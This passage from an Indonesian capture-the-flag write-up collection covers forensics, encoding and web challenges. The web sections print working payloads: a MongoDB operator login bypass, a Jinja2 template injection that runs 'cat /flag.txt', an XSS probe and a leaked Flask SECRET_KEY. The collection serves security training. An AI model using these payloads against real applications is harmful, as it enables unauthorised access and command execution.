   67e53bf refs/tags/incident-0914
   ```
4. `git fetch origin '+refs/heads/*:...' --tags` lalu bedah:
   ```
   git diff main origin/archive/q3-handover --stat
   → notes/handover.txt | 6 ++++++
   ```
   Isi `notes/handover.txt` (commit `67e53bf`, author Dimas Wirawan,
   `dimas.wirawan@netmetrics-net.example`, "archive: q3 handover notes"):
   ```
   Handover notes - Q3
   Akses staging sudah gue serahin ke tim lain.
   Semua service accounts dan database credentials sudah di-revoke atau dialihkan.
   Jangan tanya kenapa gue resign mendadak.

   sig: NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}
   ```
5. Cek dekoi: grep seluruh object (`git rev-list --objects --all`) → hanya 1
   kandidat `NFX{...}` di seluruh repo (termasuk branch/tag lain).

> Catatan: flag membaca sendiri temuannya (config header leak + hidden branch) -
> petunjuk "domain Velox Phantom" mengarah ke jejak remote/branch archive, bukan
> ke konten file. Token PAT di `.git/config` **tidak dipakai** (repo publik).

#### Kandidat flag

`NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}` - prefix `NFX{}`

---

### 5. Flag & Verifikasi

**Flag:** `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-image-metadata"></a>
# NFX CTF 2026 - Image Metadata

* **Kategori:** Forensics
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Candelena

Dalam sebuah operasi penindakan kasus spionase siber, tim DFIR berhasil menyita sebuah media penyimpanan milik pelaku. Di dalamnya ditemukan berkas gambar bukti bernama **evidence.png**.

Pemeriksaan awal menggunakan tool metadata standar tidak menemukan kejanggalan apa pun. Namun, analisis integritas file menunjukkan ukuran berkas yang tidak wajar untuk format gambar sejenisnya - mengindikasikan adanya artefak rahasia yang sengaja disisipkan di luar struktur berkas gambar resmi (*trailing bytes*).

Saat berhasil diekstrak, artefak tersebut menyimpan berkas rahasia **flag.txt** yang terkunci dengan kata sandi kuat, bersama berkas petunjuk **passwords.txt** berisi daftar 1.000 kandidat kata sandi.

Gunakan keahlian digital forensik dan teknik password cracking untuk membongkar proteksi arsip tersebut dan dapatkan isi dokumen **flag.txt**!

**Lampiran:**

- [evidence.png](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/foren/image-metadata/evidence.png) (type: file)

**Berkas di workspace:** `evidence.png`

---

### 2. TL;DR (Ringkasan Singkat)

file evidence.png menunjukkan PNG 600x300 RGB, tetapi ukurannya tidak wajar untuk gambar sekecil itu. Pemeriksaan struktur dilakukan dengan mencari akhir stream legal: d.rfind(b'IEND') menemukan posisi 31189, dan 13880 byte setelahnya berisi magic PK\x03\x04, yang berarti ada ZIP yang disisipkan setelah chunk IEND. Flag: `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}`.

**Pemahaman inti:** Ada ZIP yang disisipkan setelah chunk IEND, dan `flag.txt` di dalamnya terkunci password. Daftar 1000 kandidat di `passwords.txt` cukup untuk membukanya.

---

### 3. Analisis Awal (Recon / Discovery)

`file evidence.png` menunjukkan PNG 600x300 RGB, tetapi ukurannya tidak wajar untuk gambar sekecil itu. Pemeriksaan struktur dilakukan dengan mencari akhir stream legal: `d.rfind(b'IEND')` menemukan posisi 31189, dan 13880 byte setelahnya berisi magic `PK\x03\x04`, yang berarti ada ZIP yang disisipkan setelah chunk IEND. ZIP itu berisi dua entri: `passwords.txt` dengan 1000 kandidat password dan `flag.txt` yang terkunci. Karena metode kompresinya `store`, percobaan password berjalan instan. Kandidat kedua dalam daftar, `cyber_shield_2026`, langsung berhasil dan isi `flag.txt` adalah flag dengan prefix `NFXCTF{}`.

---

### 4. Eksploitasi / Penyelesaian

#### Kandidat flag

`NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}` - prefix `NFXCTF{}` sesuai
bukti file (bukan `NFX{}`), konsisten dengan pola ronde 1 (Cleartext juga `NFXCTF{}`).

> Reproduksi: `dd if=evidence.png bs=1 skip=31197 of=art.zip; unzip art.zip;`
> lalu crack `flag.txt` pakai `passwords.txt` (fcrackzip/john/hashcat juga jalan:
> `fcrackzip -u -D -p passwords.txt art.zip`).

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-cleartext-sniffing"></a>
# NFX CTF 2026 - Cleartext Sniffing

* **Kategori:** Forensics
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Candelena

Pukul 18.05 WIB, sistem monitoring SOC membunyikan alarm anomali dari segmen jaringan laboratorium lama. Sebuah workstation mencurigakan terdeteksi aktif menghubungi beberapa server internal lama yang seharusnya telah dipensiunkan pasca migrasi sistem.

Sebelum workstation tersebut dimatikan secara paksa, analis jaringan sempat menyalakan port mirroring (SPAN port) dan merekam seluruh lalu lintas paket data ke dalam berkas **traffic.pcap**.

Tim investigasi menduga terdapat token autentikasi penting yang bocor akibat penggunaan protokol lama yang tidak dilengkapi enkripsi. Bantulah tim penyelidik menganalisis rekaman paket jaringan tersebut, telusuri percakapan data yang terjadi, dan temukan token rahasia (flag) yang bocor!

**Lampiran:**

- [traffic.pcap](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/foren/cleartext-sniffing/traffic.pcap) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `traffic.pcap`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa traffic.pcap format pcap 2.4 di atas Ethernet. tshark -z conv,tcp menunjukkan tiga stream: HTTP ke intranet.nfx.local port 80, FTP ke port 21, dan Telnet ke port 23. Flag: `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}`.

**Pemahaman inti:** Flag ada di sesi FTP, tepatnya di perintah PASS. Kredensial Telnet hanya umpan, dan HTTP tidak membawa flag sama sekali.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa `traffic.pcap` format pcap 2.4 di atas Ethernet. `tshark -z conv,tcp` menunjukkan tiga stream: HTTP ke `intranet.nfx.local` port 80, FTP ke port 21, dan Telnet ke port 23. Karena judulnya cleartext, pemahaman awalnya adalah mencari protokol yang mengirim kredensial tanpa enkripsi. Dump per stream dengan `tshark -q -z follow,tcp,ascii,<n>` memperlihatkan isi FTP: server `filesrv.nfx.local`, user `backup`, dan perintah `PASS` yang memuat string flag. Stream Telnet hanya berisi kredensial router `operator` dan `lab-access-2026`, yang bukan flag. Pengecekan `strings` pada seluruh pcap memastikan hanya ada satu kandidat `NFX...` di file.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 08:45Z - SELESAI (flag ketemu)**

1. `file traffic.pcap` → pcap 2.4, Ethernet. `tshark -z conv,tcp` → 3 stream:
   - stream 0: `192.168.56.23 → .10:80` HTTP biasa (`intranet.nfx.local/news.html`, isi berita + CSS, **tanpa flag**)
   - stream 1: `→ .30:21` **FTP cleartext**
   - stream 2: `→ .40:23` **Telnet cleartext**
2. `tshark -r traffic.pcap -q -z follow,tcp,ascii,<n>` (dump per stream):
   - **FTP (stream 1):**
     ```
     220 filesrv.nfx.local FTP server ready
     USER backup
     331 Password required for backup
     PASS NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}
     230 User backup logged in
     ```
   - **Telnet (stream 2):** `NFX Router Console` → login `operator` / pass
     `lab-access-2026` → `show clock` = `18:03:14 WIB Thu Oct 29 2026`
     (kredensial router, **bukan** flag)
3. Decoy check: `strings -n 4 traffic.pcap | grep -oaE 'NFX[A-Z]*\{[^}]+\}'`
   → **hanya 1 kandidat** di seluruh file.

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-matryoshka-encoding"></a>
# NFX CTF 2026 - Matryoshka Encoding

* **Kategori:** Misc
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Illal


![Mystery Box](https://media.giphy.com/media/3o7TKMt1VVNkHV2PaE/giphy.gif)

Kami berhasil menyadap sebuah kapsul data transmisi yang tampaknya dirancang oleh seseorang yang sangat paranoid. Kapsul ini dibungkus berlapis-lapis layaknya boneka Matryoshka khas Rusia untuk mengelabui filter deteksi jaringan.

Setiap lapisannya menggunakan trik manipulasi data yang berbeda. Jika Anda cukup sabar dan teliti untuk mengupas bungkusnya satu per satu dari luar ke dalam, hadiah manis telah menanti Anda di inti terdalamnya.

**Lampiran:**

- [capsule.dat](https://drive.google.com/file/d/1cz-udsG8xfyiLavLSYw3qsskfhgQ-UdU/view?usp=sharing) (type: file)

**Service / Target:**

- tidak ada

**Berkas di workspace:** `capsule.dat`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran capsule.dat di workspace ternyata bukan file soal, melainkan halaman HTML Google Drive karena unduhan gagal. Langkah pertama yang benar adalah memastikan file asli, lalu mengunduh ulang sampai diperoleh payload 80 karakter base64. Flag: `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`.

**Pemahaman inti:** Rantainya bertingkat: swap pasangan karakter, base64, zlib, base85, lalu XOR repeating key. Crib `NFXCTF{` pada 4 byte pertama langsung mengungkap key `NFX!` tanpa brute.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran `capsule.dat` di workspace ternyata bukan file soal, melainkan halaman HTML Google Drive karena unduhan gagal. Langkah pertama yang benar adalah memastikan file asli, lalu mengunduh ulang sampai diperoleh payload 80 karakter base64. Dari sana polanya dibaca bertahap: tukar pasangan karakter pada string base64 sebelum decode (swap2), hasilnya stream zlib yang jika didekompresi menghasilkan string 50 karakter, lalu string itu valid sebagai base85. Sisa 40 byte biner setelah base85 terlihat seperti ciphertext XOR. Pemahaman kuncinya: prefix flag `NFXCTF{` yang sudah diketahui bisa dipakai sebagai crib pada 4 byte pertama untuk menurunkan key periodik, dan key yang cocok akan membuat seluruh 40 byte printable serta diakhiri `}`.

---

### 4. Eksploitasi / Penyelesaian

#### Temuan & rantai decode (7 Nov 2026, sesi bin)

1. **Lampiran rusak**: `capsule.dat` di folder = HTML halaman Google Drive (unduhan gagal). Unduh ulang langsung → file asli **80 char** base64: `platform_tools/capsule_raw.dat`.
2. **Lapis 1** - trik = *tukar pasangan char (swap2) di teks base64, baru decode*:
   - `b64decode(swap2(capsule))` → 58 byte stream zlib (`\x78\xda...`)
   - `zlib.decompress` → string 50 char: `0001D8UQ0qdNL|lel;*kdKqX>e|9#0K6PtNeIf@!eRg3(d3QZr`
3. **Lapis 2** - trik = *base85* (char `|;*>#@!(` semua valid di alfabet Python `b85`):
   - `base64.b85decode(string50)` → 40 byte biner: `00 00 00 62 1a 00 23 4c ... 3d 5c`
4. **Lapis 3 (inti)** - trik = *XOR repeating key*:
   - key = `NFX!` (`4e 46 58 21`) - ketemu via crib `NFXCTF{` pada 4 byte pertama + verifikasi 3 char berikutnya cocok (`TF{`), seluruh 40 byte printable, diakhiri `}`
   - `bytes(b ^ b'NFX!'[i%4])` → **flag**:
     `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`
   - Semantik isi = "matryoshka onion peeled (c309b71e)" → cocok tema soal.

#### Gagal / buang waktu (dicatat agar tak diulang)

- Base64/Caesar/rail/columnar/Vigenère/XOR byte-tunggal pada string 50 char → 0 (memang bukan basisnya).
- base91/base92/base64+rot94/xor uniform → tidak pernah menghasilkan magic zlib/flag (b85 yang benar).
- `capsule.dat` asli jangan dipakai ulang (HTML), pakai `platform_tools/capsule_raw.dat`.

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-titipan-akhir-tahun"></a>
# NFX CTF 2026 - Titipan Akhir Tahun

* **Kategori:** Misc
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{D3C0D3_D4ND3C0D3_L4G1}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Syahril

Laporan Desember sudah diperiksa berkali-kali dan semuanya beres. Tapi ada barang yang ikut terkirim tanpa tercatat di daftar isi, dan barang itu pun belum dibuka dari bungkusnya.

**Lampiran:**

- [laporan_kegiatan_bulan_desember.pdf](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/osint/laporan_kegiatan_bulan_desember.pdf) (type: file)

**Berkas di workspace:** `laporan_kegiatan_bulan_desember.pdf`

---

### 2. TL;DR (Ringkasan Singkat)

PDF 1.7 satu halaman berukuran 2357 byte, tidak terenkripsi, dan tanpa JavaScript. pdftotext -layout hanya mengeluarkan laporan Desember biasa tanpa teks tersembunyi, berbeda dari soal Notulen yang memakai teks putih. Flag: `NFX{D3C0D3_D4ND3C0D3_L4G1}`.

**Pemahaman inti:** Isi halaman PDF bersih, jadi benda tersembunyi ada di lampiran PDF yang tidak tercatat di daftar isi. `pdfdetach` mengeluarkan file base64 yang tinggal di-decode.

---

### 3. Analisis Awal (Recon / Discovery)

PDF 1.7 satu halaman berukuran 2357 byte, tidak terenkripsi, dan tanpa JavaScript. `pdftotext -layout` hanya mengeluarkan laporan Desember biasa tanpa teks tersembunyi, berbeda dari soal Notulen yang memakai teks putih. Petunjuk deskripsi tentang barang yang ikut terkirim tanpa tercatat di daftar isi mengarahkan pemeriksaan ke lampiran PDF. `pdfdetach -list` menemukan satu embedded file bernama `doksli.txt` yang tidak disebut di TOC. Setelah `pdfdetach -saveall`, isinya adalah string base64 36 byte `TkZYe0QzQzBEM19ENE5EM0MwRDNfTDRHMX0=` dengan petunjuk teks 'belum dibuka dari bungkusnya'. Decode base64 menghasilkan flag `NFX{D3C0D3_D4ND3C0D3_L4G1}`, dan isinya terbaca sebagai 'decode dan decode lagi' dalam leetspeak.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:27Z - SELESAI (flag ketemu di embedded file PDF)**

1. `file`/`pdfinfo` → PDF 1.7, 1 halaman, **2357 B**, unencrypted, tanpa JS.
   `pdftotext -layout` → laporan Desember biasa (sama seperti soal Notulen),
   **tanpa** teks flag tersembunyi di halaman (beda teknik dari Notulen).
2. "Barang ikut terkirim tanpa tercatat di daftar isi" → cek lampiran PDF:
   ```
   pdfdetach -list laporan_kegiatan_bulan_desember.pdf
   → 1 embedded files
     1: doksli.txt
   ```
   **Embedded file yang tidak disebut di TOC** = barang tersembunyi itu.
3. `pdfdetach -saveall` → `doksli.txt` (36 B, ASCII, tanpa newline):
   ```
   TkZYe0QzQzBEM19ENE5EM0MwRDNfTDRHMX0=
   ```
   "belum dibuka dari bungkusnya" → bungkus = **base64**. Decode:
   ```python
   base64.b64decode("TkZYe0QzQzBEM19ENE5EM0MwRDNfTDRHMX0=")
   → b'NFX{D3C0D3_D4ND3C0D3_L4G1}'
   ```
4. Sanity: isi ter-decode membaca "DECODE DAN DECODE LAGI" (leetspeak:
   3=E, 0=O, 4=A, 1=I) → meta-hint bahwa bungkusnya memang base64, konsisten.
   Tidak ada lapis kedua (`NFX{...}` sudah format final, bukan base64 valid).

#### Kandidat flag

`NFX{D3C0D3_D4ND3C0D3_L4G1}` - prefix `NFX{}`

> Reproduksi: `pdfdetach -saveall -o out/ laporan_kegiatan_bulan_desember.pdf; base64 -d out/doksli.txt`

---

### 5. Flag & Verifikasi

**Flag:** `NFX{D3C0D3_D4ND3C0D3_L4G1}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-notulen-senin-pagi"></a>
# NFX CTF 2026 - Notulen Senin Pagi

* **Kategori:** Misc
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{M4kHLuK_T4k_K4s4T_M4T4}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Syahril

Sekretaris bilang udah nulis semuanya. Tapi, si Bos bilang gak liat apa-apa.

**Lampiran:**

- [laporan_kegiatan_bulan_november.pdf](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/osint/laporan_kegiatan_bulan_november.pdf) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `laporan_kegiatan_bulan_november.pdf`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran PDF satu halaman A4, tidak terenkripsi, dibuat dengan Word 2021, tanpa JavaScript atau acroform. Karena tidak ada lapisan kriptografi, pemeriksaan diarahkan ke cara teks bisa disembunyikan secara visual. Flag: `NFX{M4kHLuK_T4k_K4s4T_M4T4}`.

**Pemahaman inti:** Tidak ada enkripsi: flag ditulis dengan warna putih di bawah area laporan, jadi tak terlihat saat PDF dibuka tetapi tetap terbaca oleh ekstraktor teks.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran PDF satu halaman A4, tidak terenkripsi, dibuat dengan Word 2021, tanpa JavaScript atau acroform. Karena tidak ada lapisan kriptografi, pemeriksaan diarahkan ke cara teks bisa disembunyikan secara visual. `pdftotext -layout` mengeluarkan isi laporan biasa, dan di bagian paling akhir muncul string flag. Untuk membuktikan mekanismenya, `pdftohtml -xml -hidden` dipakai: hasilnya menunjukkan `color=#ffffff` untuk teks flag, serta posisi `top=908` sementara konten laporan berhenti di sekitar `top=596`. Artinya flag ditulis putih di atas kanvas putih dan diletakkan di luar area isi. Pengecekan seluruh dokumen memastikan hanya ada satu kandidat `NFX{...}`.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 08:46Z - SELESAI (flag ketemu)**

1. `pdfinfo` → 1 halaman A4, unencrypted, Creator Word 2021, Author
   `Syahril Rizky Fauzan`, tanpa JavaScript/acroform.
2. `pdftotext -layout` → isi laporan biasa (ringkasan kegiatan, rapat, kendala)
   … dan di bagian paling akhir muncul:
   ```
   NFX{M4kHLuK_T4k_K4s4T_M4T4}
   ```
   = teks yang **tidak terlihat saat PDF dibuka** (tesis "sekretaris nulis,
   bos gak lihat").
3. Bukti mekanisme penyembunyian - `pdftohtml -xml -hidden`:
   - `<fontspec id="6" … color="#ffffff"/>` dan `id="7" … color="#ffffff"`
     → **putih di atas kanvas putih** = invisible.
   - posisi teks flag `top="908"` sedangkan konten laporan berhenti di
     `top≈596` (halaman tinggi 1263 skala XML) → teks di bawah area isi.
4. Decoy check: hanya 1 kandidat `NFX{…}` di seluruh dokumen (satu-satunya baris
   non-putih-hitam yang memuat pola flag).

#### Kandidat flag

`NFX{M4kHLuK_T4k_K4s4T_M4T4}` - format `NFX{...}` sesuai spesifikasi event

> Artefak: `laporan_kegiatan_bulan_november.pdf` (tidak diubah), dump XML
> `pdftohtml -xml -hidden -stdout` (read-only).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{M4kHLuK_T4k_K4s4T_M4T4}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexaidentity"></a>
# NFX CTF 2026 - NexaIdentity

* **Kategori:** Web
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi web)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

**NexaIdentity** adalah direktori karyawan internal dan portal identitas workspace untuk NexaCommerce. Karyawan dapat masuk, mencari kolega, membuka profil workspace, dan meninjau detail tim.

![img](https://c.tenor.com/Msq2DyQd-3sAAAAC/sailormoon-transformation.gif)

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/05_nexaidentity` (key: `NFXCTF-NFCC-NXCTF-2026`)
 **PORT BERUBAH tiap restart - cek terkini (jangan hardcode):**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# stopped -> action:up ; TTL <900dtk -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Express dengan halaman login, dashboard, dan directory. Kredensial demo employee@nexaidentity.test / employee1234 memberi sesi connect.sid, dan enum route menemukan /directory/<id> untuk id 1 sampai 12, sementara /admin mengembalikan 403 dengan pesan khusus administrator People Operations. Flag: `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`.

**Pemahaman inti:** Semua bypass konvensional gagal karena validasi login memakai query Mongo yang menerima objek. Payload `email[$ne]=x&password[$ne]=x` melewati autentikasi dan memberi sesi admin.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Express dengan halaman login, dashboard, dan directory. Kredensial demo `employee@nexaidentity.test / employee1234` memberi sesi `connect.sid`, dan enum route menemukan `/directory/<id>` untuk id 1 sampai 12, sementara `/admin` mengembalikan 403 dengan pesan khusus administrator People Operations. Sebelum menyerang, beberapa jalur umum diuji dan dicatat sebagai jalan buntu: SQLi login (`admin'--`, `' OR '1'='1`) menghasilkan 401, SSTI di parameter `q` direfleksikan literal, dan bypass `/admin` lewat path encoding, method override, header peran, referer, proto pollution, serta type juggling semuanya gagal. Pola kegagalan itu menunjukkan validasi bukan SQL, melainkan query objek. Karena server memakai parser `qs` tanpa sanitasi, field `email[$ne]` dan `password[$ne]` berubah menjadi operator Mongo `$ne`, dan pencocokan user pertama mengembalikan akun admin.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov 2026 - ronde 3 (solver web)

Service: `NFX/web/05_nexaidentity` → `http://s1.nfx.my.id:45214` (dari `nxctl inspect`; port BERUBAH tiap restart - dulu 44164).
Artefak: `platform_tools/r3/nid-*.html`, `ns-admin.html`, `nexaidentity.jar`, `ns.jar`.

1. Login demo: `employee@nexaidentity.test / employee1234` → 302 `/dashboard`. Cookie `connect.sid` (express-session).
2. Enum: hanya `/`, `/login`, `/logout`, `/dashboard`, `/directory`, `/directory/<1..12>` (id 13+ = 404). `/admin` = **403** "restricted to People Operations administrators". Admin = Nadia Kusuma `admin@nexaidentity.test` (id 1).
3. Probe negatif (jangan diulang):
   - SQLi login (`admin'--`, `' OR '1'='1`) → 401 (parameterized / bukan SQL);
   - SSTI di `q` search (`{{7*7}}`, `<%=7*7%>`) → direfleksikan polos, tidak dievaluasi;
   - bypass `/admin`: path encoding, method override, header `X-Role/X-Admin/X-Forwarded-For`, referer, proto pollution (`__proto__[role]`), password array/type juggling → tetap 403/401;
   - brute password admin ~40 kandidat pola `<kata>1234` → semua 401.
4. **Exploit - NoSQL injection di login** (MongoDB + `qs` parser tanpa sanitasi):
   ```
   POST /login (Content-Type: application/x-www-form-urlencoded)
   email[$ne]=x&password[$ne]=x
   ```
   → 302 `/dashboard` (validasi lolos utk user pertama = Nadia Kusuma, admin).
5. `GET /admin` dgn cookie hasil login itu → **200**, flag di "Restricted recovery note":
   ```
   NFX{n0sql_0p3r4t0r_4uth_byp4ss}
   ```
   Bukti: `platform_tools/r3/ns-admin.html` (grep flag + teks admin console penuh).

**FLAG: `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`** - sudah dilaporkan sebagai `FLAG_FOUND`.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{n0sql_0p3r4t0r_4uth_byp4ss}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-nexadocs"></a>
# NFX CTF 2026 - NexaDocs

* **Kategori:** Web
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{j1nja2_sstI_rce_v1a_gl0bals}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![img](https://media.giphy.com/media/UPybwzQMTxt6YRkFEE/giphy.gif)

**NexaDocs Invoice Preview** adalah workspace invoice untuk studio kreatif kecil. Tim dapat mengelola klien, membuat dan memantau invoice, serta memakai Brand Studio untuk melihat preview header dan footer sebelum dikirim.

Brand Studio baru masuk tahap beta terbatas. Tim produk ingin melakukan review keamanan sebelum fitur ini dibuka untuk semua pelanggan.

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/web/02_nexadocs` (key: `NFXCTF-NFCC-NXCTF-2026`)
 **PORT BERUBAH tiap service restart - JANGAN hardcode. Cek port terkini:**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama_service>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# bila status=stopped -> action:up dulu; TTL hampir habis -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Aplikasi Flask dengan kredensial demo yang ditulis di halaman login: demo@nexadocs.test / demo1234. Setelah login, navigasi memperlihatkan /dashboard, /invoices, /clients, dan /studio (Brand Studio). Flag: `NFX{j1nja2_sstI_rce_v1a_gl0bals}`.

**Pemahaman inti:** Input Brand Studio masuk ke template Jinja2 tanpa sanitasi. Payload `cycler.__init__.__globals__.os.popen('cat /flag.txt')` memberi RCE, dan hasilnya harus di-unescape karena output di-HTML-escape.

---

### 3. Analisis Awal (Recon / Discovery)

Aplikasi Flask dengan kredensial demo yang ditulis di halaman login: `demo@nexadocs.test / demo1234`. Setelah login, navigasi memperlihatkan `/dashboard`, `/invoices`, `/clients`, dan `/studio` (Brand Studio). Enum endpoint umum seperti `api/*`, `invoices/<id>`, `flag`, `.git`, dan `console` semuanya 404, sehingga fokus berpindah ke fitur yang menerima input bebas, yaitu Brand Studio. Form `POST /studio` punya field `company_name` dan `footer_note` yang dirender ke preview invoice. Probe `{{7*7}}` menghasilkan `49`, yang mengonfirmasi template dievaluasi, dan `{{config}}` membocorkan `SECRET_KEY`. Karena output di-escape oleh HTML, pembacaan hasil harus di-unescape; payload `cycler.__init__.__globals__.os.popen('cat /flag.txt').read()` kemudian mengembalikan flag.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:30-09:47Z - SELESAI (SSTI Jinja2 → baca /flag.txt)**

#### Service

```bash
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"NFX/web/02_nexadocs"}'
# → running, port 43302, TTL 1799s (JANGAN hardcode port - bisa berubah tiap restart)
```
Artefak sesi: `platform_tools/r2/` (cookie jar `nxdoc.jar`, helper `ssti.py`).

#### Probe

1. GET `/` 200, Werkzeug/Flask. Halaman login menampilkan **kredensial demo**:
   `demo@nexadocs.test / demo1234`.
2. POST `/login` → **302 /dashboard**, session payload
   `{"full_name":"Rara Mahendra","user_id":1}`.
3. Setelah login nav: `/dashboard`, `/invoices`, `/clients`, `/studio` (Brand Studio).
   Endpoint enum (`api/*`, `invoices/<id>`, `flag`, `.git`, `console`) → 404.
4. **Brand Studio (`/studio`)** - form `POST` field `company_name` + `footer_note`
   → dirender ke `div.invoice-preview-brand` / `.invoice-preview-footer`.
   > Deskripsi resmi: "Brand Studio tahap beta, tim produk ingin review keamanan"
   > → titik serangnya fitur ini.

#### Probe-to-exploit (SSTI)

```
POST /studio company_name={{7*7}} → brand = "49" TEMPLATE DIRENDER
POST /studio company_name={{config}} → dump config Flask lengkap
                    SECRET_KEY = b'5\x06\x1c\x96SpNaw\xde\xb0U\xf07\xe6\x18'
POST /studio company_name=${7*7} → literal "${7*7}" (bukan Jinja-syntax lain)
POST /studio company_name={7*7} → literal
```
Output di-HTML-escape (`&lt;`, `&#39;`) → unescape dulu saat baca.
(XSS juga lolos: `<img src=x onerror=alert(1)>` dirender utuh - tapi bukan jalur flag.)

#### EXPLOIT - baca file lewat globals Jinja2

```bash
python3 platform_tools/r2/ssti.py "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
→ NFX{j1nja2_sstI_rce_v1a_gl0bals}
```
